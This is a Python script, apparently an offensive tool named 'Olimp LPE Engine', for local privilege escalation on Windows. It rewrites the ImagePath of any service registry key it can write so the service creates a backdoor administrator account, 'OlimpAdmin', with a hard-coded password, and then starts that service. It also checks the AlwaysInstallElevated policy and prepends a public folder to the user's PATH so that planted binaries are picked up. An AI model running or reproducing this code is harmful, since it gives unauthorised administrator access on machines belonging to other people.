import ctypes
import winreg
import os
from ctypes import wintypes

PAYLOAD = 'cmd.exe /c net user OlimpAdmin P@ssw0rd123 /add && net localgroup S-1-5-32-544 OlimpAdmin /add'

# WinAPI Флаги
KEY_SET_VALUE = 0x0002
KEY_READ = 0x20019
KEY_WRITE = 0x20006
KEY_ENUMERATE_SUB_KEYS = 0x0008
SERVICE_START = 0x0010
SC_MANAGER_CONNECT = 0x0001
HWND_BROADCAST = 0xFFFF
WM_SETTINGCHANGE = 0x001A
SMTO_ABORTIFHUNG = 0x0002

advapi32 = ctypes.windll.advapi32
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

def log(msg, status="[*]"):
    print(f"{status} {msg}")


def trigger_service(service_name):
    
    scm = advapi32.OpenSCManagerW(None, None, SC_MANAGER_CONNECT)
    if scm:
        h_svc = advapi32.OpenServiceW(scm, service_name, SERVICE_START)
        if h_svc:
            advapi32.StartServiceW(h_svc, 0, None)
            advapi32.CloseServiceHandle(h_svc)
            log(f"Signal sent to {service_name}.", "[+]")
        advapi32.CloseServiceHandle(scm)

def hijack_service_registry():
    log("Scanning HKLM Services for insecure permissions...")
    base_path = r"SYSTEM\CurrentControlSet\Services"
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, base_path, 0, KEY_READ | KEY_ENUMERATE_SUB_KEYS) as root:
            num_subkeys = winreg.QueryInfoKey(root)[0]
            for i in range(num_subkeys):
                svc_name = winreg.EnumKey(root, i)
                svc_key_path = f"{base_path}\\{svc_name}"
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, svc_key_path, 0, KEY_SET_VALUE) as k:
                        log(f"VULNERABLE SERVICE: {svc_name}", "!")
                        winreg.SetValueEx(k, "ImagePath", 0, winreg.REG_EXPAND_SZ, PAYLOAD)
                        trigger_service(svc_name)
                        return True
                except OSError: continue
    except Exception as e: log(f"Service scan error: {e}", "[-]")
    return False

def check_always_install_elevated():
    log("Auditing AlwaysInstallElevated policy...")
    res = False
    for root in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        try:
            with winreg.OpenKey(root, r"SOFTWARE\Policies\Microsoft\Windows\Installer", 0, KEY_READ) as k:
                if winreg.QueryValueEx(k, "AlwaysInstallElevated")[0] == 1:
                    log(f"VULNERABILITY: Enabled in {'HKCU' if root == winreg.HKEY_CURRENT_USER else 'HKLM'}", "!!!")
                    res = True
        except OSError: pass
    return res


def shadow_env_path():
   
    log("Attempting Environment Path Shadowing...")
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment", 0, KEY_READ | KEY_WRITE) as k:
            try:
                old_path, _ = winreg.QueryValueEx(k, "PATH")
            except OSError: old_path = ""
            
            
            new_path = f"C:\\Users\\Public;{old_path}"
            winreg.SetValueEx(k, "PATH", 0, winreg.REG_SZ, new_path)
            
            user32.SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0, "Environment", SMTO_ABORTIFHUNG, 5000, None)
            log("User PATH hijacked. Drop payload to C:\\Users\\Public", "[+]")
    except Exception as e: log(f"Shadowing failed: {e}", "[-]")

def main():
    print("--- Olimp LPE Engine v5.0 (Stealth & Native) ---")
    
    if hijack_service_registry():
        log("Exploit active. Verifying admin status...", "[DONE]")
    else:
        log("No direct registry write access found.", "[-]")
        
        check_always_install_elevated()
        
        shadow_env_path()
        
        tasks_path = os.path.join(os.environ['SYSTEMROOT'], "System32", "Tasks")
        log(f"Manual check recommended: {tasks_path} for weak ACLs.")

    log("Operation complete.", "[*]")

if __name__ == "__main__":
    main()
